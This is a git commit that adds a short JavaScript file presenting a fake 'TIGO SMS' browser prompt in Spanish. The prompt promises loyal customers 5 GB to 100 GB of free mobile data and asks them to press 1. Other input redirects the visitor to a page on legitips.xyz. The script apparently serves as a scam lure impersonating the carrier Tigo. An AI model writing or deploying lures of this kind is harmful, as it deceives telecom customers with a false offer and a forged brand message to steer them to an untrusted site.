05ecc55aa8a8e36334bdf98617803a83839f5fbe
legitips <83867893+legitips@users.noreply.github.com>
2024-07-19 16:07:20 -0700

    Create activation-tigofreeoffers.js

---
+++ activation-tigofreeoffers.js
@@ -0,0 +1,5 @@
+var password = '1'
+password=prompt('TIGO SMS: Estimado cliente, verifique amablemente si su tarjeta SIM TIGO califica para recibir de 5 GB a 100 GB de datos, recompensa para clientes antiguos, presione 1 para verificar ahora ','1');
+if (password != '1') {
+location.href='https://legitips.xyz/tigofreeoffers.html';
+}
